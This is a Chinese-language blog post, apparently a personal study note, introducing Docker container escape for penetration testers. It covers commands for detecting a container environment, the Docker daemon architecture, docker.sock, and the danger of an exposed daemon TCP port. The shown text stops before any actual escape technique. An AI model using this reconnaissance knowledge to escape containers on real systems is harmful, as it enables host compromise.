<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>我的技术与生活——docker逃逸原理 | Mr.Long</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
  <link rel="stylesheet" href="/css/public.css" />
  <link rel="stylesheet" href="/css/layout.css" />
  <link rel="stylesheet" href="/css/iconfont.css" />
  <link rel="stylesheet" href="/css/APlayer.min.css" />
  <script src="/js/APlayer.min.js"></script>
  <script src="/js/jquery.min.js"></script>
  <script src="/js/jquery.pjax.min.js"></script>

  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <script>
    document.title = `我的技术与生活——docker逃逸原理`
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>

<style>
  .load {
    width: 100%;
    height: 100vh;
    background-color: rgb(37, 35, 40);
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    position: relative;
    z-index: 9999;
  }
  .load-circle {
    width: 80px;
    height: 80px;
    border: 8px solid orange;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    animation: rotate 1s linear infinite;
    filter: drop-shadow(0 0 3px orange);
  }
  .load-circle-inner {
    width: 40px;
    height: 40px;
    border: 8px solid orange;
    border-top-color: transparent;
    border-radius: 50%;
    animation: rotate-reverse .5s linear infinite;
  }
  .load-text {
    margin-top: 20px;
    font-size: 24px;
    color: orange;
    display: flex;
  }
  .load-text span {
    margin: 0 5px;
    text-shadow: 5px 5px 5px orange;
    animation: move 1s linear infinite;
  }
  .load-text span:nth-child(1) {
    animation-delay: -0.6s;
  }
  .load-text span:nth-child(2) {
    animation-delay: -0.5s;
  }
  .load-text span:nth-child(3) {
    animation-delay: -0.4s;
  }
  .load-text span:nth-child(4) {
    animation-delay: -0.3s;
  }
  .load-text span:nth-child(5) {
    animation-delay: -0.2s;
  }
  .load-text span:nth-child(6) {
    animation-delay: -0.1s;
  }
  @keyframes rotate {
    0% { transform: rotate(0); }
    100% { transform: rotate(360deg); }
  }
  @keyframes rotate-reverse {
    0% { transform: rotate(0); }
    100% { transform: rotate(-360deg); }
  }
  @keyframes move {
    0% { transform: translateY(0%) rotate(0) scale(1); }
    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
    100% { transform: translateY(0) rotate(0) scale(1); }
  }

  .progress {
    position: fixed;
    left: 0; top: 0;
    width: 0;
    height: 3px;
    background-color: green;
    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
    z-index: 9999;
  }

  .to-up {
    animation: toUp .5s 1;
  }
  .gray {
    position: fixed;
    left: 0;
    top: 0;
    width: 100%;
    height: 100vh;
    z-index: 9999;
    display: none;
    pointer-events: none;
    background-color: #000;
    mix-blend-mode: color;
  }
  @keyframes toUp {
    from { transform: translateY(15px); opacity: 0; }
    to { transform: translateY(0) ; opacity: 1; }
  }
</style>
<body>
  <div id="load" class="load">
    <div class="load-circle">
      <div class="load-circle-inner"></div>
    </div>
    <p class="load-text">
      <span>L</span>
      <span>O</span>
      <span>A</span>
      <span>D</span>
      <span>I</span>
      <span>N</span>
      <span>G</span>
    </p>
  </div>
  <div id="container" class="container w-100 vh-100" style="display: none;">
    <header class="header">
  <div class="header-wrapper">
    <div class="header-left">
      <div class="header-search">
        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
      </div>
      <div id="search-layer" class="header-search--layer hidden">
        <p class="title">
          <span>以下是搜索内容：</span>
          <span id="close-layer-btn">关闭</span>
        </p>
        <ul>
        </ul>
      </div>
    </div>
    <div class="header-right">
      <ul class="header-menu">
        <li>
          <a href="http://example.com/">
            <i class="header-menu--icon iconfont icon-shouye"></i>
            <span class="header-menu--span">首页</span>
          </a>
        </li>
        <li>
          <a href="http://example.com/log">
            <i class="header-menu--icon iconfont icon-rizhi"></i>
            <span class="header-menu--span">日志</span>
          </a>
        </li>
        <li>
          <a href="http://example.com/link">
            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
            <span class="header-menu--span">友情链接</span>
          </a>
        </li>
        <li>
          <a href="http://example.com/about">
            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
            <span class="header-menu--span">关于我</span>
          </a>
        </li>
      </ul>
    </div>
  </div>
</header>

<script>
  const ipt = document.querySelector('#search-input')
  const btn = document.querySelector('#search-btn')
  const layer = document.querySelector('#search-layer')
  const posts = JSON.parse(`[{"title":"docker命令","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/21/Docker命令大全/"},{"title":"Kubernetes扩展","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/2e0af7de62ed4210b634c867367c10ae2e0af7de62ed4210b634c867367c10ae","path":"2024/06/01/Kubernetes容器编排技术[扩展]/"},{"title":"LVM逻辑卷管理","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/d733537fd3e06784932826b5e82a855d","path":"2023/06/28/LVM逻辑卷管理/"},{"title":"LV移除、缩容","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/d733537fd3e06784932826b5e82a855d","path":"2023/06/14/LV逻辑卷扩展/"},{"title":"PXE+Kickstart无人值守安装操作系统","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/82cb48f718f8acc8cb2568140eeaaec382cb48f718f8acc8cb2568140eeaaec3","path":"2023/06/26/PXE+Kickstart无人值守安装操作系统/"},{"title":"python一","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15096963228077376","path":"2024/02/20/Python1/"},{"title":"python三","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15096963228077376","path":"2024/02/25/Python3/"},{"title":"PQL","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/240007b00ab1bcd1e3af7bb55f18a966","path":"2024/06/30/PromQL 讲解/"},{"title":"python二","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15096963228077376","path":"2024/02/21/Python2/"},{"title":"TCP协议","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15047394039467328","path":"2023/06/23/TCP协议/"},{"title":"python四","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15096963228077376","path":"2024/03/01/Python4/"},{"title":"Kubernetes组件学习","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/2e0af7de62ed4210b634c867367c10ae2e0af7de62ed4210b634c867367c10ae","path":"2024/06/02/Kubernetes组件/"},{"title":"docker容器","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/11/docker容器/"},{"title":"FTP文件服务器","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/a9045286aa9b50dcc09302eff83b328a","path":"2023/06/23/ftp/"},{"title":"Galera集群","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/3719037aa1a43c4806d84ac9bd3dbc34","path":"2024/07/26/galera/"},{"title":"redis操作","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/a13d778b5db38e4b127b71bdf122f695","path":"2023/09/26/Redis操作/"},{"title":"ansible模块","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/1e624a7ba7e09f195b3f2f384b2b9bb1","path":"2023/08/17/ansible 模块扩展/"},{"title":"Kubernetes数据库","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/2e0af7de62ed4210b634c867367c10ae2e0af7de62ed4210b634c867367c10ae","path":"2024/06/14/k8s集群数据库/"},{"title":"nginx2","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/8c29198625ff99eee0073bbbb137bbc78c29198625ff99eee0073bbbb137bbc7","path":"2023/12/19/nginx2/"},{"title":"nginx3","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/8c29198625ff99eee0073bbbb137bbc78c29198625ff99eee0073bbbb137bbc7","path":"2023/12/22/nginx3/"},{"title":"nginx1","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/8c29198625ff99eee0073bbbb137bbc78c29198625ff99eee0073bbbb137bbc7","path":"2023/12/17/nginx1/"},{"title":"nginx5","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/8c29198625ff99eee0073bbbb137bbc78c29198625ff99eee0073bbbb137bbc7","path":"2023/12/31/nnginx5/"},{"title":"nginx4","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/8c29198625ff99eee0073bbbb137bbc78c29198625ff99eee0073bbbb137bbc7","path":"2023/12/30/nginx4/"},{"title":"redis集群安装","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/a13d778b5db38e4b127b71bdf122f695","path":"2023/09/21/redis集群/"},{"title":"shell脚本","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/9217d5c6d87ce0e8ec7422ca7469db95","path":"2024/08/10/shell脚本/"},{"title":"prometheus","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/240007b00ab1bcd1e3af7bb55f18a966","path":"2024/06/16/prometheus 监控/"},{"title":"shell编程","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/9217d5c6d87ce0e8ec7422ca7469db95","path":"2023/07/21/shell_newrain/"},{"title":"prometheus-exporter","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/240007b00ab1bcd1e3af7bb55f18a966","path":"2024/06/16/node_exporter/"},{"title":"docker镜像容器","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/14/容器技术-docker2/"},{"title":"Kubernetes集群部署","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/2e0af7de62ed4210b634c867367c10ae2e0af7de62ed4210b634c867367c10ae","path":"2024/06/10/二进制方式部署k8s集群/"},{"title":"docker-Compose","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/21/容器技术-docker5/"},{"title":"docker资源限制","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/15/容器技术docker4/"},{"title":"docker安装","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/06/容器技术-Docker1/"},{"title":"docker容器","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/13/容器技术-docker3/"},{"title":"linux文件管理","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/de0f7b079a80d192f90989d9c2c9622d","path":"2023/06/21/文件管理/"},{"title":"用户文件权限","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/3719037aa1a43c4806d84ac9bd3dbc34","path":"2023/06/01/文件权限/"},{"title":"单用户模式破解密码","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/3f6ae566e1f093d2d9dbcc3df361fc4b3f6ae566e1f093d2d9dbcc3df361fc4b","path":"2023/07/01/破解密码/"},{"title":"微服务项目","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/3719037aa1a43c4806d84ac9bd3dbc34","path":"2024/07/26/微服务项目-mall-swarm/"},{"title":"存储管理--1","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/d733537fd3e06784932826b5e82a855d","path":"2023/06/25/磁盘存储管理1/"},{"title":"磁盘阵列","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/69d9906ff9bf88dbc02184ecb8504fc5","path":"2023/07/09/磁盘阵列RAID/"},{"title":"prometheus自定义监控","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/240007b00ab1bcd1e3af7bb55f18a966","path":"2024/06/26/自定义监控/"},{"title":"微服务","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/3719037aa1a43c4806d84ac9bd3dbc34","path":"2024/07/26/微服务概念/"},{"title":"Linux网卡","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/346f59e468f2155074d1fb3164594702","path":"2023/06/11/网络管理基础/"},{"title":"自建YUM源","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/56260873f5720f373c20f43587eab0b8","path":"2023/06/21/自建yum源笔记/"},{"title":"Kubernetes蓝鲸智云平台部署","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/2e0af7de62ed4210b634c867367c10ae2e0af7de62ed4210b634c867367c10ae","path":"2024/09/01/蓝鲸智云平台部署/"},{"title":"走进网络世界","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/583716b0cb306203c308cc0def55dd9e583716b0cb306203c308cc0def55dd9e","path":"2023/06/16/走进网络世界/"},{"title":"docker逃逸原理","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5","path":"2024/03/11/Docker逃逸原理/"},{"title":"keepalived 配置lvs","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15384717158682944","path":"2023/12/03/keepalived 配 置lvs/"},{"title":"keepalived-邮件mail","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15384717158682944","path":"2023/12/03/keepalived-邮件/"},{"title":"lvs 中的资源配置永久生效和临时生效","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15384717158682944","path":"2023/12/03/lvs中的资源配置永久生效和临时生效/"},{"title":"python连接vscode遇到的问题","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15096963228077376","path":"2024/02/10/python连接vscode遇到的问题/"},{"title":"python学习","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15096963228077376","path":"2024/02/22/python项目/"},{"title":"tomcat session复制及session共享技术","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15143898353798464","path":"2023/09/07/tomcat session复制及session共享技术/"},{"title":"Tomcat01","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15143898353798464","path":"2023/09/03/企业 Tomcat 运维1/"},{"title":"配置tomcat session共享","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15143898353798464","path":"2023/09/16/基于redisson实现tomcat集群session共享/"},{"title":"nginx-TOP-0","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/8c29198625ff99eee0073bbbb137bbc78c29198625ff99eee0073bbbb137bbc7","path":"2023/12/21/服务器nginx配置/"},{"title":"Haproxy","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15384717158682944","path":"2023/12/03/扩展-haproxy/"},{"title":"负载均衡集群","cover":"https://haowallpaper.com/link/common/file/getCroppingImg/15384717158682944","path":"2023/12/03/负载均衡集群 -讲课/"}]`)
  ipt.addEventListener('keyup', e => {
    if (e.key === 'Enter') {
      handleSearch()
    }
  })
  btn.addEventListener('click', () => {
    handleSearch()
  })

  document.querySelector('#close-layer-btn').addEventListener('click', () => {
    layer.classList.toggle('hidden')
  })

  function handleSearch() {
    if (ipt.value.trim() === '') {
      return
    }
    let html = ''
    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
    targetPosts.forEach(post => {
      html += `
        <li>
          <div>
            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
          </div>
          <img src="${post.cover || '/imgs/default-cover.webp' }" />
        </li>
      `
    })
    if (html.trim () === '') {
      html += '<p class="empty">没有搜索到内容</p>'
    }
    layer.querySelector('ul').innerHTML = html
    layer.classList.remove('hidden')
  }
</script> 
    <section id="main" class="main">
      <div class="main-left-wrapper">
<div class="main-left">
  <div class="main-left--block">
    <div class="main-left--info">
      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
      <div class="main-left--intro">
        <p class="main-left--name">Mr.Long</p>
        <div class="main-left--tags">
          <span class="main-left--tag">唱跳rap篮球</span>
          <span class="main-left--tag">宅但不肥</span>
        </div>
      </div>
    </div>
  
    <div>
      <div class="main-left--motto">
        <p>“花有重开日，人无再少年”</p>
        <p>“一个简单普通的男孩”</p>
      </div>
      <div class="main-left--github">
        <span class="line"></span>
        <a target="_blank" rel="noopener" href="https://github.com/MyRong99/MyRong99.github.io"><i class="logo iconfont icon-github-fill"></i></a>
        <span class="line"></span>
      </div>
      <div class="main-left--statics">
        <a href="/categories">
          <div>
            <span>0</span>
            <span>分类</span>
          </div>
        </a>
        <a href="/tags">
          <div>
            <span>8</span>
            <span>标签</span>
          </div>
        </a>
        <a href="/archives">
          <div>
            <span>11 </span>
            <span>归档</span>
          </div>
        </a>
      </div>
    </div>
  </div>

  <div class="main-left--block">
    <ul class="main-left--menu">
      
        <li>
          <a href="/">
            <span class="header-menu--span">小站首页</span>
            <i class="header-menu--icon iconfont icon-shouye"></i>
          </a>
        </li>
      
        <li>
          <a href="/log">
            <span class="header-menu--span">个人日志</span>
            <i class="header-menu--icon iconfont icon-rizhi"></i>
          </a>
        </li>
      
        <li>
          <a href="/link">
            <span class="header-menu--span">友情链接</span>
            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
          </a>
        </li>
      
        <li>
          <a href="/about">
            <span class="header-menu--span">关于自己</span>
            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
          </a>
        </li>
      
        <li>
          <a href="/tools">
            <span class="header-menu--span">我的工具</span>
            <i class="header-menu--icon iconfont icon-gongju"></i>
          </a>
        </li>
      
    </ul>
  </div>

  <div class="main-left--block">
    <div class="main-left--site">
      <h5 class="main-left--title">
        <span>站点信息</span>
        <i class="iconfont icon-zhandian"></i>
      </h5>
      <p class="main-left--subtitle">
        <span>文章数目：</span>
        <span>58 篇</span>
      </p>
      <p class="main-left--subtitle">
        <span>最近动态：</span>
        <span>今天</span>
      </p>
      <p class="main-left--subtitle">
        <span>上线时间：</span>
        <span>440天</span>
      </p>
      <p class="main-left--subtitle">
        <span>当前版本：</span>
        <span>v1.0.2</span>
      </p>
    </div>
  </div>
</div></div>
      <div id="main-container" class="main-container">


  <link rel="stylesheet" href="/css/partial/article.css" />

<div class="article-container">
  <div class="article">
    <h1 class="article-title">docker逃逸原理</h1>
    <div class="article-info">
      <div class="article-info--item">
        <div class="article-info--info">
          
          <div class="article-info--categories">
            <span>分类：</span>
            
          </div>
          
          
          <div class="article-info--tags">
            <span>标签：</span>
            <a class="tag-link" href="/tags/Docker/" rel="tag">-Docker</a>
          </div>
          
          <p class="article-info--date">日期：2024-03-11 20:13:47</p>
        </div>
        <img src="https://haowallpaper.com/link/common/file/getCroppingImg/71e27d1e01da8c13f3f165a1c3bcc8b571e27d1e01da8c13f3f165a1c3bcc8b5" alt="" class="article-cover">
      </div>
    </div>
    <article class="article-content markdown-body">
      <h1 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Docker 逃逸在渗透测试中面向的场景大概是这样，渗透拿到shell后，发现主机是docker环境，要进一步渗透，就必须逃逸到“直接宿主机”。甚至还有物理机运行虚拟机，虚拟机运行Docker容器的情况。那就还要虚拟机逃逸了。</p>
<h2 id="环境判断"><a href="#环境判断" class="headerlink" title="环境判断"></a>环境判断</h2><p>检查根目录下是否存在.dockerenv文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>

<p>检查 &#x2F;proc&#x2F;1&#x2F;cgroup 是否存在含有docker字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<p>检查是否存在container环境变量<br>通过env \ PATH 来检查是否有docker相关的环境变量，来进一步判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">env</span><br><span class="line">env $PATH</span><br><span class="line">set</span><br><span class="line">检测mount、fdisk -l列出所有分区</span><br></pre></td></tr></table></figure>

<p>判断PID 1的进程名</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>Docker C&#x2F;S</strong></p>
<p>Docker 是以客户端和守护进程的方式来运行</p>
<p>在 Docker Client （即 Docker 客户端）当中，运行 Docker 各种命令。而这些命令会传递给 Docker 的宿主机上运行的 Docker 的守护进程。Docker 的守护进程负责实现 Docker 的各种功能。</p>
<p><img src="https://guangxipengyuyan.oss-cn-guangzhou.aliyuncs.com/image-20240902121100243.png" alt="image-20240902121100243"></p>
<p><strong>Docker客户端和守护进程</strong></p>
<p><img src="https://guangxipengyuyan.oss-cn-guangzhou.aliyuncs.com/image-20240902121112565.png" alt="image-20240902121112565"></p>
<p>Docker 的守护进程运行在宿主机上（即 C&#x2F;S 架构的 server 端），守护进程会在运行后一直在后台运行，负责实现 Docker 的各种功能。而 Docker 的使用者并不会与守护进程进程交互，而是通过 Docker 的客户端（即 Docker 命令行接口）与 Docker 守护进程进行通信。Docker 命令行接口（即在 Shell 中执行的二进制程序）是 Docker 的最主要的用户接口，用来从用户处接收 Docker 的命令并且传递给守护进程。而守护进程将命令执行的结果返回给客户端并显示在命令行接口中。</p>
<p><strong>Remote API</strong></p>
<p>Docker自定义程序和守护进程</p>
<p>Docker 命令行接口虽然是 Docker 的最主要的用户接口，Docker 实际上也提供了另外的与守护进程通信的方式，即 Remote API。它也是一个 RESTful 风格的 API ，可以通过编写程序调用这个 API 来将自己的程序与 Docker 容器进行集成。</p>
<p>但 Docker 的 REmote API 在某些复杂的情况下也支持 STDIN、STDOUT、STDERR 方式来进行通信和交互。更多关于 API 的详细信息查看官网 Engine API v1.24 。</p>
<p><strong>Docker Daemon 的连接方式</strong></p>
<p>UNIX 域套接字：unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock (默认)</p>
<p>默认就是这种方式, 会生成一个 &#x2F;var&#x2F;run&#x2F;docker.sock 文件, UNIX 域套接字用于本地进程之间的通讯, 这种方式相比于网络套接字效率更高, 但局限性就是只能被本地的客户端访问。</p>
<p>tcp 端口监听：tcp:&#x2F;&#x2F;host:port</p>
<p>服务端开启端口监听 dockerd -H IP:PORT , 客户端通过指定IP和端口访问服务端 docker -H IP:PORT 。通过这种方式, 任何人只要知道了你暴露的ip和端口就能随意访问你的docker服务了, 这是一件很危险的事, 因为docker的权限很高, 不法分子可以从这突破取得服务端宿主机的最高权限。</p>
<p><strong>Docker C&#x2F;S 运行方式’</strong></p>
<p><img src="https://guangxipengyuyan.oss-cn-guangzhou.aliyuncs.com/image-20240902121152781.png" alt="image-20240902121152781">‘</p>
<p>用户自定义的程序通过 Remote API 调用 Docker 服务。而 Docker 的客户端与 Docker 的服务器端通过 Socket 等进行连接。那么，这种连接本身意味着 Docker Client 和 Server 既可以在同一台机器上运行，也可以在不同的机器运行，即 Docker Client 可以通过远程的方式访问 Docker Server。</p>
<p><strong>查看 Docker 的守护进程的情况</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep docker</span><br><span class="line"></span><br><span class="line">sudo service docker status</span><br></pre></td></tr></table></figure>


<p><strong>docker守护进程启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">docker -d [OPTIONS]</span><br><span class="line">运行相关:</span><br><span class="line">    -D,--debug=false</span><br><span class="line">    -e,--exec-driver=&quot;native&quot;</span><br><span class="line">    -g,--graph=&quot;/var/bin/docker&quot;</span><br><span class="line">    --icc=true</span><br><span class="line">    -l,--log-level=&quot;info&quot;</span><br><span class="line">    -able=[]</span><br><span class="line">    -p,--pidfile=&quot;/var/run/dpcker.pid&quot;</span><br><span class="line">     ...</span><br><span class="line">docker 服务器连接相关:</span><br><span class="line">    -G,--group=&quot;docker&quot;</span><br><span class="line">    -H,--host=[]</span><br><span class="line">    --tls=flase</span><br><span class="line">    --tlscacert=&quot;/home/sven/.docker/ca.pem&quot;</span><br><span class="line">    --tlscert=&quot;/home/sven/.docker/cert.pem&quot;</span><br><span class="line">    --tlskey=&quot;/home/sven/.dovker/key.pem&quot;</span><br><span class="line">    --tlsverify=false </span><br><span class="line">     ...</span><br><span class="line">RemoateAPI相关:</span><br><span class="line">     --api-enable-cors=false</span><br><span class="line">      ...</span><br><span class="line">存储相关:</span><br><span class="line">    -s,--storage-driver=&quot;&quot;</span><br><span class="line">    --selinux-enabled=flase</span><br><span class="line">    --storage-opt=[]</span><br><span class="line">    ...</span><br><span class="line">Registry相关:</span><br><span class="line">    --insecure-registry=[]</span><br><span class="line">    --registry-mirror=[]</span><br><span class="line">    ...</span><br><span class="line">网络设置相关:</span><br><span class="line">    -b,--bridge=&quot;&quot;</span><br><span class="line">    --bip=&quot;&quot;</span><br><span class="line">    --fixed-cidr=&quot;&quot;</span><br><span class="line">    --fixed-cidr-v6=&quot;&quot;</span><br><span class="line">    --dns=[]</span><br><span class="line">    --dns-search=[]</span><br><span class="line">    --ip=0.0.0.0</span><br><span class="line">    --ip-forward=ture</span><br><span class="line">    --ip-masq=ture</span><br><span class="line">    --iptables=ture</span><br><span class="line">    --ipv6=false</span><br><span class="line">    --mtu=0</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>


<p><strong>unix socket</strong><br>unix socket可以让一个程序通过类似处理一个文件的方式和另一个程序通信，这是一种进程间通信的方式（IPC）。</p>
<p>当你在host上安装并且启动好docker，docker daemon 会自动创建一个socket文件并且保存在&#x2F;var&#x2F;run&#x2F;docker.sock目录下。docker daemon监听着socket中即将到来的链接请求（可以通过-H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock设定docker daemon监听的socket文件，-H参数还可以设定监听tcp:port或者其它的unix socket），当一个链接请求到来时，它会使用标准IO来读写数据。</p>
<p>docker.sock 是docker client 和docker daemon 在localhost进行通信的socket文件。</p>
<p>可以直接call这个socket文件来拉去镜像，创建容器，启动容器等一系列操作。（其实就是直接call docker daemon API而不是通过docker client的方式去操控docker daemon）。</p>
<p>[外链图片转存中…(img-lr2He2gw-1671282239672)]</p>
<p>翻译过来就是：–host&#x3D;[]指定Docker守护程序将在何处侦听客户端连接。如果未指定，则默认为&#x2F;var&#x2F;run&#x2F;docker.sock</p>
<p>所以docker客户端只要把请求发往这里，daemon就能收到并且做出响应。</p>
<p>按照上面的解释来推理：我们也可以向&#x2F;var&#x2F;run&#x2F;docker.sock发送请求，也能达到docker ps、docker images这样的效果</p>
<h3 id="docker组件"><a href="#docker组件" class="headerlink" title="docker组件"></a>docker组件</h3><p>安装 docker ，其实是安装了 docker 客户端、dockerd 等一系列的组件，其中比较重要的有下面几个。</p>
<p><strong>Docker CLI(docker)</strong></p>
<p>docker 程序是一个客户端工具，用来把用户的请求发送给 docker daemon(dockerd)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/docker</span><br></pre></td></tr></table></figure>


<p><strong>Dockerd</strong></p>
<p>docker daemon(dockerd)，docker守护进程，一般也会被称为 docker engine。</p>
<p>&#x2F;usr&#x2F;bin&#x2F;dockerd</p>
<p><strong>Containerd</strong></p>
<p>在宿主机中管理完整的容器生命周期：容器镜像的传输和存储、容器的执行和管理、存储和网络等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/docker-containerd</span><br></pre></td></tr></table></figure>


<p><strong>Containerd-shim</strong></p>
<p>它是 containerd 的组件，是容器的运行时载体，主要是用于剥离 containerd 守护进程与容器进程，引入shim，允许runc 在创建和运行容器之后退出，并将 shim 作为容器的父进程，而不是 containerd 作为父进程，这样做的目的是当 containerd 进程挂掉，由于 shim 还正常运行，因此可以保证容器不受影响。此外，shim 也可以收集和报告容器的退出状态，不需要 containerd 来 wait 容器进程。我们在 docker 宿主机上看到的 shim 也正是代表着一个个通过调用 containerd 启动的 docker 容器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/docker-containerd-shim</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>RunC</strong></p>
